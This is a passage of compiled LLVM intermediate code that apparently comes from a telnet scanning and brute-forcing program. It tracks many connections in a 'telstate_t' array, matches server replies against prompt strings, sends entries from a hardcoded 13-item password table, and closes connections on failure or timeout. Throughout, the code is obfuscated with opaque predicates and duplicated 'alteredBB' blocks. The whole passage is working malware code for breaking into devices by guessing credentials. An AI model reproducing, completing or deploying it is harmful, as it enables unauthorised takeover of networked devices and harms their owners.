  %1218 = or i1 %1216, %1217
  br i1 %1218, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br label %3344

; <label>:1219:                                   ; preds = %1152
  %1220 = load i32, i32* %10, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 0
  %1224 = load i32, i32* %1223, align 16
  %1225 = load i32, i32* %10, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1226
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1227, i32 0, i32 8
  %1229 = load i8*, i8** %1228, align 8
  %1230 = load i32, i32* %10, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 7
  %1234 = load i16, i16* %1233, align 16
  %1235 = zext i16 %1234 to i32
  %1236 = call i32 @readUntil(i32 %1224, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1229, i32 1024, i32 %1235)
  %1237 = icmp ne i32 %1236, 0
  br i1 %1237, label %1238, label %1302

; <label>:1238:                                   ; preds = %1219
  %1239 = load i32, i32* @x.67
  %1240 = load i32, i32* @y.68
  %1241 = sub i32 %1239, 1
  %1242 = mul i32 %1239, %1241
  %1243 = urem i32 %1242, 2
  %1244 = icmp eq i32 %1243, 0
  %1245 = icmp slt i32 %1240, 10
  %1246 = or i1 %1244, %1245
  br i1 %1246, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %1238
  %1247 = load i32, i32* %10, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 6
  store i32 0, i32* %1250, align 4
  %1251 = load i32, i32* %10, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 7
  store i16 0, i16* %1254, align 16
  %1255 = load i32, i32* %10, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 8
  %1259 = load i8*, i8** %1258, align 8
  %1260 = call i8* @strstr(i8* %1259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %1261 = icmp ne i8* %1260, null
  %1262 = load i32, i32* @x.67
  %1263 = load i32, i32* @y.68
  %1264 = sub i32 %1262, 1
  %1265 = mul i32 %1262, %1264
  %1266 = urem i32 %1265, 2
  %1267 = icmp eq i32 %1266, 0
  %1268 = icmp slt i32 %1263, 10
  %1269 = or i1 %1267, %1268
  br i1 %1269, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br i1 %1261, label %1270, label %1275

; <label>:1270:                                   ; preds = %originalBBpart2167
  %1271 = load i32, i32* %10, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 2
  store i8 5, i8* %1274, align 8
  br label %1296

; <label>:1275:                                   ; preds = %originalBBpart2167
  %1276 = load i32, i32* @x.67
  %1277 = load i32, i32* @y.68
  %1278 = sub i32 %1276, 1
  %1279 = mul i32 %1276, %1278
  %1280 = urem i32 %1279, 2
  %1281 = icmp eq i32 %1280, 0
  %1282 = icmp slt i32 %1277, 10
  %1283 = or i1 %1281, %1282
  br i1 %1283, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %1275
  %1284 = load i32, i32* %10, align 4
  %1285 = sext i32 %1284 to i64
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1285
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1286, i32 0, i32 2
  store i8 7, i8* %1287, align 8
  %1288 = load i32, i32* @x.67
  %1289 = load i32, i32* @y.68
  %1290 = sub i32 %1288, 1
  %1291 = mul i32 %1288, %1290
  %1292 = urem i32 %1291, 2
  %1293 = icmp eq i32 %1292, 0
  %1294 = icmp slt i32 %1289, 10
  %1295 = or i1 %1293, %1294
  br i1 %1295, label %originalBBpart2171, label %originalBB169alteredBB

originalBBpart2171:                               ; preds = %originalBB169
  br label %1296

; <label>:1296:                                   ; preds = %originalBBpart2171, %1270
  %1297 = load i32, i32* %10, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 8
  %1301 = load i8*, i8** %1300, align 8
  call void @llvm.memset.p0i8.i64(i8* %1301, i8 0, i64 1024, i32 1, i1 false)
  br label %3344

; <label>:1302:                                   ; preds = %1219
  %1303 = load i32, i32* %10, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1304
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1305, i32 0, i32 8
  %1307 = load i8*, i8** %1306, align 8
  %1308 = call i8* @strstr(i8* %1307, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1309 = icmp ne i8* %1308, null
  br i1 %1309, label %1310, label %1325

; <label>:1310:                                   ; preds = %1302
  %1311 = load i32, i32* %10, align 4
  %1312 = sext i32 %1311 to i64
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1312
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1313, i32 0, i32 0
  %1315 = load i32, i32* %1314, align 16
  %1316 = call i32 @sclose(i32 %1315)
  %1317 = load i32, i32* %10, align 4
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1318
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1319, i32 0, i32 2
  store i8 0, i8* %1320, align 8
  %1321 = load i32, i32* %10, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1322
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 3
  store i8 0, i8* %1324, align 1
  br label %3344

; <label>:1325:                                   ; preds = %1302
  %1326 = load i32, i32* %10, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 8
  %1330 = load i8*, i8** %1329, align 8
  %1331 = call i8* @strstr(i8* %1330, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1332 = icmp ne i8* %1331, null
  br i1 %1332, label %1333, label %1348

; <label>:1333:                                   ; preds = %1325
  %1334 = load i32, i32* %10, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 0
  %1338 = load i32, i32* %1337, align 16
  %1339 = call i32 @sclose(i32 %1338)
  %1340 = load i32, i32* %10, align 4
  %1341 = sext i32 %1340 to i64
  %1342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1341
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1342, i32 0, i32 2
  store i8 0, i8* %1343, align 8
  %1344 = load i32, i32* %10, align 4
  %1345 = sext i32 %1344 to i64
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1345
  %1347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1346, i32 0, i32 3
  store i8 0, i8* %1347, align 1
  br label %3344

; <label>:1348:                                   ; preds = %1325
  %1349 = load i32, i32* %10, align 4
  %1350 = sext i32 %1349 to i64
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1351, i32 0, i32 8
  %1353 = load i8*, i8** %1352, align 8
  %1354 = call i8* @strstr(i8* %1353, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1355 = icmp ne i8* %1354, null
  br i1 %1355, label %1356, label %1371

; <label>:1356:                                   ; preds = %1348
  %1357 = load i32, i32* %10, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 0
  %1361 = load i32, i32* %1360, align 16
  %1362 = call i32 @sclose(i32 %1361)
  %1363 = load i32, i32* %10, align 4
  %1364 = sext i32 %1363 to i64
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1364
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1365, i32 0, i32 2
  store i8 0, i8* %1366, align 8
  %1367 = load i32, i32* %10, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1368
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1369, i32 0, i32 3
  store i8 0, i8* %1370, align 1
  br label %3344

; <label>:1371:                                   ; preds = %1348
  %1372 = load i32, i32* @x.67
  %1373 = load i32, i32* @y.68
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBB173, label %originalBB173alteredBB

originalBB173:                                    ; preds = %originalBB173alteredBB, %1371
  %1380 = load i32, i32* %10, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 8
  %1384 = load i8*, i8** %1383, align 8
  %1385 = call i8* @strstr(i8* %1384, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1386 = icmp ne i8* %1385, null
  %1387 = load i32, i32* @x.67
  %1388 = load i32, i32* @y.68
  %1389 = sub i32 %1387, 1
  %1390 = mul i32 %1387, %1389
  %1391 = urem i32 %1390, 2
  %1392 = icmp eq i32 %1391, 0
  %1393 = icmp slt i32 %1388, 10
  %1394 = or i1 %1392, %1393
  br i1 %1394, label %originalBBpart2175, label %originalBB173alteredBB

originalBBpart2175:                               ; preds = %originalBB173
  br i1 %1386, label %1395, label %1426

; <label>:1395:                                   ; preds = %originalBBpart2175
  %1396 = load i32, i32* @x.67
  %1397 = load i32, i32* @y.68
  %1398 = sub i32 %1396, 1
  %1399 = mul i32 %1396, %1398
  %1400 = urem i32 %1399, 2
  %1401 = icmp eq i32 %1400, 0
  %1402 = icmp slt i32 %1397, 10
  %1403 = or i1 %1401, %1402
  br i1 %1403, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %1395
  %1404 = load i32, i32* %10, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 0
  %1408 = load i32, i32* %1407, align 16
  %1409 = call i32 @sclose(i32 %1408)
  %1410 = load i32, i32* %10, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 2
  store i8 0, i8* %1413, align 8
  %1414 = load i32, i32* %10, align 4
  %1415 = sext i32 %1414 to i64
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1415
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1416, i32 0, i32 3
  store i8 0, i8* %1417, align 1
  %1418 = load i32, i32* @x.67
  %1419 = load i32, i32* @y.68
  %1420 = sub i32 %1418, 1
  %1421 = mul i32 %1418, %1420
  %1422 = urem i32 %1421, 2
  %1423 = icmp eq i32 %1422, 0
  %1424 = icmp slt i32 %1419, 10
  %1425 = or i1 %1423, %1424
  br i1 %1425, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  br label %3344

; <label>:1426:                                   ; preds = %originalBBpart2175
  %1427 = load i32, i32* @x.67
  %1428 = load i32, i32* @y.68
  %1429 = sub i32 %1427, 1
  %1430 = mul i32 %1427, %1429
  %1431 = urem i32 %1430, 2
  %1432 = icmp eq i32 %1431, 0
  %1433 = icmp slt i32 %1428, 10
  %1434 = or i1 %1432, %1433
  br i1 %1434, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %1426
  %1435 = load i32, i32* %10, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1437, i32 0, i32 8
  %1439 = load i8*, i8** %1438, align 8
  %1440 = call i8* @strstr(i8* %1439, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1441 = icmp ne i8* %1440, null
  %1442 = load i32, i32* @x.67
  %1443 = load i32, i32* @y.68
  %1444 = sub i32 %1442, 1
  %1445 = mul i32 %1442, %1444
  %1446 = urem i32 %1445, 2
  %1447 = icmp eq i32 %1446, 0
  %1448 = icmp slt i32 %1443, 10
  %1449 = or i1 %1447, %1448
  br i1 %1449, label %originalBBpart2183, label %originalBB181alteredBB

originalBBpart2183:                               ; preds = %originalBB181
  br i1 %1441, label %1450, label %1465

; <label>:1450:                                   ; preds = %originalBBpart2183
  %1451 = load i32, i32* %10, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 0
  %1455 = load i32, i32* %1454, align 16
  %1456 = call i32 @sclose(i32 %1455)
  %1457 = load i32, i32* %10, align 4
  %1458 = sext i32 %1457 to i64
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1458
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1459, i32 0, i32 2
  store i8 0, i8* %1460, align 8
  %1461 = load i32, i32* %10, align 4
  %1462 = sext i32 %1461 to i64
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1462
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1463, i32 0, i32 3
  store i8 0, i8* %1464, align 1
  br label %3344

; <label>:1465:                                   ; preds = %originalBBpart2183
  %1466 = load i32, i32* %10, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 8
  %1470 = load i8*, i8** %1469, align 8
  %1471 = call i8* @strstr(i8* %1470, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1472 = icmp ne i8* %1471, null
  br i1 %1472, label %1473, label %1488

; <label>:1473:                                   ; preds = %1465
  %1474 = load i32, i32* %10, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1476, i32 0, i32 0
  %1478 = load i32, i32* %1477, align 16
  %1479 = call i32 @sclose(i32 %1478)
  %1480 = load i32, i32* %10, align 4
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1481
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1482, i32 0, i32 2
  store i8 0, i8* %1483, align 8
  %1484 = load i32, i32* %10, align 4
  %1485 = sext i32 %1484 to i64
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1485
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1486, i32 0, i32 3
  store i8 0, i8* %1487, align 1
  br label %3344

; <label>:1488:                                   ; preds = %1465
  %1489 = load i32, i32* %10, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 8
  %1493 = load i8*, i8** %1492, align 8
  %1494 = call i8* @strstr(i8* %1493, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1495 = icmp ne i8* %1494, null
  br i1 %1495, label %1496, label %1527

; <label>:1496:                                   ; preds = %1488
  %1497 = load i32, i32* @x.67
  %1498 = load i32, i32* @y.68
  %1499 = sub i32 %1497, 1
  %1500 = mul i32 %1497, %1499
  %1501 = urem i32 %1500, 2
  %1502 = icmp eq i32 %1501, 0
  %1503 = icmp slt i32 %1498, 10
  %1504 = or i1 %1502, %1503
  br i1 %1504, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %1496
  %1505 = load i32, i32* %10, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 0
  %1509 = load i32, i32* %1508, align 16
  %1510 = call i32 @sclose(i32 %1509)
  %1511 = load i32, i32* %10, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 2
  store i8 0, i8* %1514, align 8
  %1515 = load i32, i32* %10, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1516
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1517, i32 0, i32 3
  store i8 0, i8* %1518, align 1
  %1519 = load i32, i32* @x.67
  %1520 = load i32, i32* @y.68
  %1521 = sub i32 %1519, 1
  %1522 = mul i32 %1519, %1521
  %1523 = urem i32 %1522, 2
  %1524 = icmp eq i32 %1523, 0
  %1525 = icmp slt i32 %1520, 10
  %1526 = or i1 %1524, %1525
  br i1 %1526, label %originalBBpart2187, label %originalBB185alteredBB

originalBBpart2187:                               ; preds = %originalBB185
  br label %3344

; <label>:1527:                                   ; preds = %1488
  %1528 = load i32, i32* %10, align 4
  %1529 = sext i32 %1528 to i64
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 8
  %1532 = load i8*, i8** %1531, align 8
  %1533 = call i8* @strstr(i8* %1532, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1534 = icmp ne i8* %1533, null
  br i1 %1534, label %1535, label %1566

; <label>:1535:                                   ; preds = %1527
  %1536 = load i32, i32* @x.67
  %1537 = load i32, i32* @y.68
  %1538 = sub i32 %1536, 1
  %1539 = mul i32 %1536, %1538
  %1540 = urem i32 %1539, 2
  %1541 = icmp eq i32 %1540, 0
  %1542 = icmp slt i32 %1537, 10
  %1543 = or i1 %1541, %1542
  br i1 %1543, label %originalBB189, label %originalBB189alteredBB

originalBB189:                                    ; preds = %originalBB189alteredBB, %1535
  %1544 = load i32, i32* %10, align 4
  %1545 = sext i32 %1544 to i64
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1545
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1546, i32 0, i32 0
  %1548 = load i32, i32* %1547, align 16
  %1549 = call i32 @sclose(i32 %1548)
  %1550 = load i32, i32* %10, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1551
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1552, i32 0, i32 2
  store i8 0, i8* %1553, align 8
  %1554 = load i32, i32* %10, align 4
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1555
  %1557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1556, i32 0, i32 3
  store i8 0, i8* %1557, align 1
  %1558 = load i32, i32* @x.67
  %1559 = load i32, i32* @y.68
  %1560 = sub i32 %1558, 1
  %1561 = mul i32 %1558, %1560
  %1562 = urem i32 %1561, 2
  %1563 = icmp eq i32 %1562, 0
  %1564 = icmp slt i32 %1559, 10
  %1565 = or i1 %1563, %1564
  br i1 %1565, label %originalBBpart2191, label %originalBB189alteredBB

originalBBpart2191:                               ; preds = %originalBB189
  br label %3344

; <label>:1566:                                   ; preds = %1527
  %1567 = load i32, i32* %10, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1568
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1569, i32 0, i32 8
  %1571 = load i8*, i8** %1570, align 8
  %1572 = call i8* @strstr(i8* %1571, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1573 = icmp ne i8* %1572, null
  br i1 %1573, label %1574, label %1605

; <label>:1574:                                   ; preds = %1566
  %1575 = load i32, i32* @x.67
  %1576 = load i32, i32* @y.68
  %1577 = sub i32 %1575, 1
  %1578 = mul i32 %1575, %1577
  %1579 = urem i32 %1578, 2
  %1580 = icmp eq i32 %1579, 0
  %1581 = icmp slt i32 %1576, 10
  %1582 = or i1 %1580, %1581
  br i1 %1582, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %1574
  %1583 = load i32, i32* %10, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 0
  %1587 = load i32, i32* %1586, align 16
  %1588 = call i32 @sclose(i32 %1587)
  %1589 = load i32, i32* %10, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 2
  store i8 0, i8* %1592, align 8
  %1593 = load i32, i32* %10, align 4
  %1594 = sext i32 %1593 to i64
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1594
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1595, i32 0, i32 3
  store i8 0, i8* %1596, align 1
  %1597 = load i32, i32* @x.67
  %1598 = load i32, i32* @y.68
  %1599 = sub i32 %1597, 1
  %1600 = mul i32 %1597, %1599
  %1601 = urem i32 %1600, 2
  %1602 = icmp eq i32 %1601, 0
  %1603 = icmp slt i32 %1598, 10
  %1604 = or i1 %1602, %1603
  br i1 %1604, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br label %3344

; <label>:1605:                                   ; preds = %1566
  %1606 = load i32, i32* %10, align 4
  %1607 = sext i32 %1606 to i64
  %1608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1607
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1608, i32 0, i32 8
  %1610 = load i8*, i8** %1609, align 8
  %1611 = call i64 @strlen(i8* %1610) #10
  %1612 = trunc i64 %1611 to i16
  %1613 = load i32, i32* %10, align 4
  %1614 = sext i32 %1613 to i64
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1614
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1615, i32 0, i32 7
  store i16 %1612, i16* %1616, align 16
  br label %1617

; <label>:1617:                                   ; preds = %1605
  %1618 = load i32, i32* %10, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1619
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1620, i32 0, i32 6
  %1622 = load i32, i32* %1621, align 4
  %1623 = add i32 %1622, 10
  %1624 = zext i32 %1623 to i64
  %1625 = call i64 @time(i64* null) #2
  %1626 = icmp slt i64 %1624, %1625
  br i1 %1626, label %1627, label %1642

; <label>:1627:                                   ; preds = %1617
  %1628 = load i32, i32* %10, align 4
  %1629 = sext i32 %1628 to i64
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1629
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1630, i32 0, i32 0
  %1632 = load i32, i32* %1631, align 16
  %1633 = call i32 @sclose(i32 %1632)
  %1634 = load i32, i32* %10, align 4
  %1635 = sext i32 %1634 to i64
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1635
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1636, i32 0, i32 2
  store i8 0, i8* %1637, align 8
  %1638 = load i32, i32* %10, align 4
  %1639 = sext i32 %1638 to i64
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1639
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1640, i32 0, i32 3
  store i8 1, i8* %1641, align 1
  br label %1642

; <label>:1642:                                   ; preds = %1627, %1617
  br label %3327

; <label>:1643:                                   ; preds = %101
  %1644 = load i32, i32* @x.67
  %1645 = load i32, i32* @y.68
  %1646 = sub i32 %1644, 1
  %1647 = mul i32 %1644, %1646
  %1648 = urem i32 %1647, 2
  %1649 = icmp eq i32 %1648, 0
  %1650 = icmp slt i32 %1645, 10
  %1651 = or i1 %1649, %1650
  br i1 %1651, label %originalBB197, label %originalBB197alteredBB

originalBB197:                                    ; preds = %originalBB197alteredBB, %1643
  %1652 = load i32, i32* %10, align 4
  %1653 = sext i32 %1652 to i64
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1653
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1654, i32 0, i32 0
  %1656 = load i32, i32* %1655, align 16
  %1657 = load i32, i32* %10, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 5
  %1661 = load i8, i8* %1660, align 1
  %1662 = zext i8 %1661 to i64
  %1663 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1662
  %1664 = load i8*, i8** %1663, align 8
  %1665 = load i32, i32* %10, align 4
  %1666 = sext i32 %1665 to i64
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1666
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1667, i32 0, i32 5
  %1669 = load i8, i8* %1668, align 1
  %1670 = zext i8 %1669 to i64
  %1671 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1670
  %1672 = load i8*, i8** %1671, align 8
  %1673 = call i64 @strlen(i8* %1672) #10
  %1674 = call i64 @send(i32 %1656, i8* %1664, i64 %1673, i32 16384)
  %1675 = icmp slt i64 %1674, 0
  %1676 = load i32, i32* @x.67
  %1677 = load i32, i32* @y.68
  %1678 = sub i32 %1676, 1
  %1679 = mul i32 %1676, %1678
  %1680 = urem i32 %1679, 2
  %1681 = icmp eq i32 %1680, 0
  %1682 = icmp slt i32 %1677, 10
  %1683 = or i1 %1681, %1682
  br i1 %1683, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  br i1 %1675, label %1684, label %1699

; <label>:1684:                                   ; preds = %originalBBpart2199
  %1685 = load i32, i32* %10, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1686
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1687, i32 0, i32 0
  %1689 = load i32, i32* %1688, align 16
  %1690 = call i32 @sclose(i32 %1689)
  %1691 = load i32, i32* %10, align 4
